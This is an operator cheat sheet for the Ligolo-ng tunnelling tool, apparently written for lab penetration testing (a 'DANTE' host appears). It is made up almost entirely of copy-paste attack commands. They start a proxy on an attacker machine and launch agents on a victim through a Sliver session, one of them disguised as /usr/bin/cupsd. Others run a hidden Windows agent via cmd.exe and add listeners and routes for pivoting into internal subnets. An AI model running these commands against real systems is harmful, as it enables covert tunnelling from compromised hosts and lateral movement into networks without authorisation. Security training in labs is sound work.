# Ligolo-ng

### Quick Copy Paste&#x20;

```
# proxy setup on attacker machine
./proxy -selfcert -laddr https://0.0.0.0:1080
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:1080
# agent from victim machine
- from sliver 
execute /usr/bin/cupsd "-connect 10.10.14.2:1080 -ignore-cert"
ligolo-ng » INFO[0672] Agent joined.                                 name=root@DANTE-WEB-NIX01 remote="10.10.110.100:58358"
# from attacker machine ligolo-ng cmd
session 
- choose session 
auto_route
- verify 
curl http://172.16.1.1
```

### Windows Agent

* start ligalo-ng windows agent in background via cmd.exe

```
cmd.exe /c start /b .\agent.exe -connect 172.16.1.100:7777 -ignore-cert
```

* start ligalo-ng windows agent via sliver session&#x20;

```
 execute -f '.\agent.exe -connect 172.16.1.20:6666 -ignore-cert'
```

### Add Listener&#x20;

* add ligalo-ng listener listen on 172.16.2.5:8888 on connect forward to 10.10.14.3:8080 via tcp

```
   listener_add --addr 172.16.2.5:8888 --to 10.10.14.3:8080 --tcp

```

### Add Additional route

* Certain situations call for an additional route.
* Imagine you have root access to a machine `10.100.0.3` and you are able to route to `172.16.0.0/24`&#x20;
* Ligolo will not auto detect this as it will auto route you for the `10.110.0.0/24`&#x20;

```
tunnel_list
# get the name of your active interface 
route_add --name adeptsunshine --route 172.16.0.1/24
```
